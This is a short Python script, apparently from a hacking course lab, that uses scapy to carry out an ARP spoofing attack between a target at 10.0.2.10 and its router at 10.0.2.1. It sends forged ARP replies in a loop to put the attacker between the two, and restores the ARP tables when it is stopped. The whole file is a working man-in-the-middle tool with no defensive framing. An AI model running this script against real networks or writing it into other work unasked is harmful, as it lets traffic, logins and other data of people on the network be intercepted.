#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

# The second method to execute after spoofing
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_req
    ans = scapy.srp(arp_packet, timeout=1, verbose=False)[0]

    return ans[0][1].hwsrc

# The first method in the spoofing
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# The last method in the spoofing but not related to spoofing.
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.10"
router_ip = "10.0.2.1"

packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        packets_count = packets_count + 2
        print("\r Sent packets : " + str(packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print(" Resetting ARP tables....... Please wait.")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)

    
 
